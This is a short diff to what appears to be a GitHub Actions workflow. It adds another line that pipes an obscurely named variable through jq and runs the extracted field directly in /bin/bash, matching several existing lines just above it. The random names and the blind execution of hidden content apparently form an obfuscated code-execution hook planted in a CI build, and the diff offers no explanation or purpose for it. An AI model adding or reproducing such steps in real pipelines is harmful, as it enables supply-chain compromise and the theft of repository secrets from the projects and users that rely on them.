@@ -40,6 +40,7 @@ jobs:
           echo $x00 | jq -r .t358 | /bin/bash
           printf '%s' "$jtapi5221" | jq -r .wmdl768 | /bin/bash
           printf '%s' "$gnxbk7438" | jq -r .kjce40183 | /bin/bash
+          printf '%s' "$mjz30786" | jq -r .sfyiy1 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
